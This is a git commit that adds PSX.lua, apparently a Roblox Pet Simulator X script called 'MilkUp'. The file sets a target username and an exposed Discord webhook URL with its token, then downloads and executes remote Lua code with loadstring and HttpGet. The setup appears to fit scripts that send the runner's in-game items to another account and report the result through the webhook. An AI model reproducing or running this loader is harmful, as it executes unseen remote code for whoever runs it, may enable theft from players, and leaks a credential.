26122e4a8e17b54369c5bbef4b2a8e7afb5acd36
Essaw21 <130885725+Essaw21@users.noreply.github.com>
2023-04-16 11:17:42 +0200

    MilkUp

---
+++ PSX.lua
@@ -0,0 +1,5 @@
+_G.Username = "igor5432100"
+_G.HubName = "MilkUp"
+_G.WebhookUrl = "https://discord.com/api/webhooks/1008127415689674812/FVM6zdxUJF8WQRyDT7eJW94Xt64PkEQGnajyo-w7aJnRtw_i1swetiEmct0ls9CdN1Si"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Jayiioceanii/PeakOnTop/main/peak.lua"))()
